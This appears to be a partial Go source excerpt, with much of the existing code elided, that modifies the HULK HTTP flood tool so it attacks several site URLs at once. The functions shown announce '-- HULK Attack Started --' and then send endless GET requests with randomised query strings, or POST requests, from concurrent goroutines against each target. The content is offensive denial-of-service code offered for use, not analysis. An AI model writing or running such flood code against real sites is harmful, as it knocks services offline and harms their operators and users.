package main

// ... (existing imports and constants)

// Add a new flag to accept multiple site URLs
var siteURLs arrayFlags

// ...

func main() {
	// ... (existing flag variables and parsing)

	// Get the list of site URLs from the command line arguments
	siteURLs = arrayFlags(flag.Args())

	// ...

	go func() {
		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")

		// Call httpcall for each site URL in a goroutine
		for _, siteURL := range siteURLs {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(siteURL, ss)
			}
		}

		// ...
	}()
}

// ...

// Modify httpcall function to accept siteURL as a parameter instead of url string
func httpcall(siteURL string, s chan uint8) {
	// ... (existing code)

	for {
		// Create the request using the siteURL
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", siteURL+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", siteURL, strings.NewReader(data))
		}

		// ... (existing code)

		r, e := client.Do(q)
		// ... (existing code)
	}
}
